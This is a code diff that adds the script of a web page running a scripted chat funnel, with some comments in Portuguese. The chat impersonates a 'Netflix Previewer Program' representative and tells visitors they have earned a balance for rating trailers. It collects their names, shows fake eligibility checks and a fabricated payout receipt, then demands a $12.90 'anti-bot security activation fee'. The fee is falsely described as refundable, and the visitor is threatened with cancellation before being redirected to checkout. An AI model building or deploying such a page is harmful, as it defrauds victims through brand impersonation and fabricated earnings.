+        f.frameBorder = '0';
+        f.setAttribute('allowfullscreen', '');
+        f.setAttribute('referrerpolicy', 'origin');
+        f.src = 'about:blank';
+        f.onload = function () {
+          f.onload = null;
+          f.src = url + ((window.spTrackingSearch || location.search) || '?') + '&vl=' + encodeURIComponent(location.href);
+        };
+        f.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:0';
+        w.appendChild(f);
+        botRow(w, 'media');
+        return f;
+      }
+
+
+      function clearInput() { input.innerHTML = ''; }
+
+      function askButton(label) {
+        return new Promise(function (resolve) {
+          clearInput();
+          var b = document.createElement('button');
+          b.className = 'cta';
+          b.textContent = label;
+          b.onclick = function () {
+            clearInput();
+            userRow(label);
+            resolve(label);
+          };
+          input.appendChild(b);
+          scroll();
+        });
+      }
+
+      function askText(placeholder) {
+        return new Promise(function (resolve) {
+          clearInput();
+          var wrap = document.createElement('form');
+          wrap.className = 'field';
+          var i = document.createElement('input');
+          i.type = 'text'; i.placeholder = placeholder; i.autocomplete = 'name';
+          var s = document.createElement('button');
+          s.type = 'submit'; s.innerHTML = '&#10148;';
+          wrap.appendChild(i); wrap.appendChild(s);
+          wrap.onsubmit = function (e) {
+            e.preventDefault();
+            var v = i.value.trim();
+            if (!v) return;
+            clearInput();
+            userRow(v);
+            resolve(v);
+          };
+          input.appendChild(wrap);
+          scroll();
+          setTimeout(function () { i.focus(); }, 200);
+        });
+      }
+
+      function waitForSongs(timeoutMs) {
+        return new Promise(function (resolve) {
+          var done = false;
+          function finish() {
+            if (done) return;
+            done = true;
+            window.removeEventListener('message', onMsg);
+            resolve();
+          }
+          function onMsg(e) {
+            var d = e.data;
+            var s = typeof d === 'string' ? d : (d && (d.name || d.event || d.type)) || '';
+            if (String(s).indexOf('finalizar_musicas') !== -1 || String(s).indexOf('finish') !== -1) finish();
+          }
+          window.addEventListener('message', onMsg);
+          setTimeout(finish, timeoutMs);
+        });
+      }
+
+      function step(name) {
+        var key = 'trk_fired_' + name;
+        try { if (sessionStorage.getItem(key)) return; sessionStorage.setItem(key, '1'); } catch (e) {}
+        var tries = 0;
+        (function attempt() {
+          var trk = window.trkFunnel;
+          if (trk && typeof trk.step === 'function') { try { trk.step(name); } catch (e) {} return; }
+          if (++tries <= 240) setTimeout(attempt, 250);
+        })();
+      }
+
+      async function run() {
+        // Etapa 01
+        step('chegou_vsl');
+        step('comeco');
+        await say('To begin your service, your case number is 809821');
+        await sleep(4000);
+        await say("You've been one of the few viewers selected for the Netflix Previewer Program");
+        await sleep(3000);
+        await say("Netflix invests billions in new originals every year, and we need real human feedback before global release to calibrate title thumbnails and recommendation algorithms.");
+        await sleep(3000);
+        await say("We've selected four pre-release trailers for you to preview and rate from 1 to 5 stars. It takes less than two minutes.");
+        step('avaliacao1');
+        media('/sp/songs/index.html', 355);
+        await waitForSongs(600000);
+        await sleep(3000);
+        await say('Click the button below to continue with your registration.');
+        await sleep(3000);
+
+        // Etapa 02
+        await askButton('Start Verification');
+        step('start_verification1');
+        step('iniciouspt');
+        await sleep(2000);
+        activateRepresentative();
+        await sayStatus('Kaytlynn, the Netflix Previewer representative, has joined the chat', 'success');
+        await sleep(4000);
+        await say('Hi, welcome to the Netflix Previewer Program!');
+        await sleep(3000);
+        // [VSL 1 - BOAS-VINDAS / INTRODUÇÃO]
+        media(VSL_1_EMBED_URL, 620);
+        await sleep(VSL_1_DELAY_MS);
+        await say('You have a balance of ${{balance}} in our app');
+        await sleep(3000);
+        await say('Would you like to continue so you can withdraw your money?');
+        await say('(Click the button below to continue)');
+        await askButton('Yes, I would like to withdraw');
+
+        // Etapa 03
+        await say("Would you like to receive your reward for the trailer evaluations you've completed?");
+        await say('(Click the button below to continue)');
+        await askButton('Yes, I do!');
+        step('yes_i_do1');
+
+        // Etapa 04 - name
+        step('coleta_de_nome1');
+        await sayStatus("Okay, I'll continue with your registration.", 'success');
+        await sleep(3000);
+        await say("At this stage, I need you to tell me your name so I can verify that you're a new previewer.");
+        await sleep(3000);
+        await say('What is your full name?');
+        await say('(Write below)');
+        vars.nome = await askText('Enter your name here...');
+        var checkingRow = await sayStatus('Checking...', 'pending');
+        await sleep(6000);
+
+        // Etapa 05
+        step('elegibilidade1');
+        await updateStatus(checkingRow, 'Just a moment...', 'pending');
+        await sleep(10000);
+        await updateStatus(checkingRow, 'Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your payout of ${{balance}}', 'success');
+
+        // Etapa 06
+        step('recibo1');
+        await sleep(3000);
+        await say('I\u2019m sending you the receipt for your evaluations.');
+        await sleep(1000);
+        var receiptLoadingRow = await sayStatus('Loading...', 'pending');
+        await sleep(4000);
+        await updateStatus(receiptLoadingRow, 'Generating your payout withdrawal receipt...', 'pending');
+        await sleep(4000);
+        var receiptFrame = media('/sp/receipt/index.html?nome=' + encodeURIComponent(vars.nome) + '&total=' + encodeURIComponent((currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)), 440);
+        receiptFrame.className = 'withdraw-receipt';
+        receiptFrame.onload = function () {
+          var documentReceipt = receiptFrame.contentDocument && receiptFrame.contentDocument.querySelector('.receipt');
+          if (!documentReceipt) return;
+          function fitReceipt() {
+            var height = Math.ceil(documentReceipt.getBoundingClientRect().height);
+            receiptFrame.style.height = height + 'px';
+            receiptFrame.height = height;
+          }
+          new ResizeObserver(fitReceipt).observe(documentReceipt);
+          fitReceipt();
+        };
+        await sleep(4000);
+
+        // Etapa 07
+        await say('(Click the button below to continue)');
+        await askButton('I want to claim my reward');
+        step('vslspt');
+
+        // VSL + oferta
+        step('vsl_checkout1');
+        await sayStatus('Your access to withdraw your payout will be granted after this short explanatory video', 'alert');
+        // [VSL 2 - PITCH PRINCIPAL DE CONVERSÃO]
+        player(VSL_2_EMBED_URL, 56.25);
+        var __h = location.hostname;
+        var __isDev = __h === 'localhost' || __h === '127.0.0.1' || __h.indexOf('id-preview--') === 0 || __h.indexOf('-dev.lovable.app') > -1 || __h.indexOf('.lovableproject.com') > -1 || __h.indexOf('.sandbox.lovable.dev') > -1 || new URLSearchParams((window.spTrackingSearch || location.search)).get('dev') === '1';
+        await sleep(__isDev ? 0 : VSL_2_DELAY_MS);
+        step('assistiu_pitch');
+        await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small anti-bot security activation fee of $12.90\n\nThis is to verify your identity as a real viewer and ensure that you are not an automated bot.', 'reward');
+        await sleep(5000);
+        await sayStatus('Please note: The $12.90 fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
+        await sleep(4000);
+        await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another viewer on the waiting list.');
+        await sleep(3000);
+        await say('You are being redirected to the payment page...');
+        step('clicou_botao');
+        step('checkoutspt');
+        step('checkout1');
+        var checkoutUrl = window.spUrlWith(CHECKOUT, {
+          name: vars.nome || '',
+          nome: vars.nome || '',
+          spot: '1',
+          preview: 'black',
+          ref: 'chat',
+          visit_id: (window.spParams && window.spParams.visit_id) || localStorage.getItem('sp_visit_id') || '',
+          balance: (currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)
+        });
+        // Dispara InitiateCheckout no Meta Pixel se ativo
+        try { if (window.fbq) fbq('track', 'InitiateCheckout'); } catch (e) {}
+        // Aciona o hook do Utmify (que intercepta window.open e dispara o InitiateCheckout da regra de URL)
+        try { window.open(checkoutUrl, '_self'); } catch (e) {}
+        // Fallback garantido com 350ms para a requisição de IC da Utmify ser enviada antes do redirecionamento
+        setTimeout(function () {
+          try { window.top.location.href = checkoutUrl; } catch (e) { window.location.href = checkoutUrl; }
+        }, 350);
+      }
+
+      run();
+    })();
+  </script>
+
+
+</body>
+
+</html>
